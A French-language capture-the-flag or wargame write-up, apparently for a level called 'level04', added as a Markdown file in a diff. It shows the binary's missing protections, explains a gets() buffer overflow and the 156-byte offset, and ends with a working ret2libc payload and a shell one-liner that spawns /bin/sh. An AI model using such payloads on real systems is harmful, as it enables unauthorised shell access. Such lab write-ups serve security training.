@@ -1,0 +1,32 @@
+<!-- vim: syntax=Markdown -->
+
+| RELRO | STACK CANARY | NX | PIE | RPATH | RUNPATH | FILE |
+| :---- | :----------- | :- | :-- | :---- | :------ | :--- |
+| <span style="color:yellow">Partial RELRO</span> | <span style="color:red">No canary found</span> | <span style="color:red">NX disabled</span> | <span style="color:red">No PIE</span> | <span style="color:green">No RPATH</span> | <span style="color:green">No RUNPATH</span> | <span style="background-color:red">/home/users/level04/level04</span> |
+
+|    |    |
+| :- | :- |
+| **Architecture** | x86 |
+| **Exploit type** | buffer overflow |
+
+Dès l'ouverture de `gdb` et le disas, on remarque l'utilisation de la fonction `gets`, qui est totalement sujette au buffer overflow.
+
+Nous avons passé énormément de temps pour essayer de faire un shellcode fonctionnel, mais nous n'avons pas réussi.
+
+Un autre moyen est de passer par un `ret2libc`, et nous avons pu utiliser le même que le level 01, avec un offset différent.\
+Le décalage est simple à calculer :
+- la stack est augmentée de 3 push (3 * 4 bytes = 12 bytes)
+- puis sub 0xb0 (176 octets)
+- le gets se fait à `esp+0x20` donc `176 + 12 - 32 = 156`
+
+```plaintext
+offset    system           exit          /bin/sh
+┌─┴─┐┌──────┴───────┐┌──────┴───────┐┌──────┴───────┐
+%156s\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7
+```
+
+Avec ça, le premier input ne fonctionne pas (mais le second oui), alors on peut rajouter un petit `\n` pour plus confort.
+
+```sh
+(printf "%156s\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7\n"; cat) | ./level04
+```
